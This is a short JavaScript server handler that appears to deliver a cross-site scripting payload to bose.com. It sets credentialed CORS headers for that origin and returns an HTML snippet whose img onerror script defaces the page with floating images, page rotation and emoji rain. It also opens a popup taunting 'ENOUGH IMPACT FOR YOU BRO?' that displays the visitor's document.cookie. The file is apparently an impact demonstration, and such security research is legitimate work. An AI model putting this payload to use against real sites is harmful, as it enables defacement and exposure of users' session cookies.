export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', 'https://www.bose.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS, POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  res.status(200).json([
    {
      placement: {
        anchor: 'body',
        mode: 'append'
      },
      html: `
<img src=x onerror="
(function(){

  // === Floating poggers ===
  const imgUrl = 'https://i.imgur.com/dortPBR.png';
  for (let i = 0; i < 6; i++) {
    let img = document.createElement('img');
    img.src = imgUrl;
    img.style.position = 'fixed';
    img.style.width = '100px';
    img.style.zIndex = 999999;
    img.style.top = Math.random()*90 + '%';
    img.style.left = Math.random()*90 + '%';
    img.style.transition = 'all 2s linear';
    document.body.appendChild(img);

    setInterval(() => {
      img.style.top = Math.random()*90 + '%';
      img.style.left = Math.random()*90 + '%';
      img.style.transform = 'rotate(' + Math.random()*360 + 'deg)';
    }, 2000);
  }

  // === Meme popup ===
  let popup = document.createElement('div');
  popup.innerText = 'ENOUGH IMPACT FOR YOU BRO?\\n\\n🍪 ' + document.cookie;
  popup.style.position = 'fixed';
  popup.style.top = '20%';
  popup.style.left = '50%';
  popup.style.transform = 'translateX(-50%)';
  popup.style.background = 'black';
  popup.style.color = 'lime';
  popup.style.padding = '20px';
  popup.style.fontFamily = 'monospace';
  popup.style.zIndex = 9999999;
  popup.style.border = '3px solid red';
  popup.style.boxShadow = '0 0 20px red';
  document.body.appendChild(popup);

  // === Slight chaos mode ===
  setInterval(() => {
    document.body.style.transform = 'rotate(' + (Math.random()*2 - 1) + 'deg)';
  }, 200);

  // === Emoji rain ===
  setInterval(() => {
    let e = document.createElement('div');
    e.innerText = '💀🔥😂';
    e.style.position = 'fixed';
    e.style.left = Math.random()*100 + '%';
    e.style.top = Math.random()*100 + '%';
    e.style.zIndex = 999999;
    document.body.appendChild(e);
    setTimeout(()=>e.remove(), 2000);
  }, 300);

})();
">
`
    }
  ]);
}
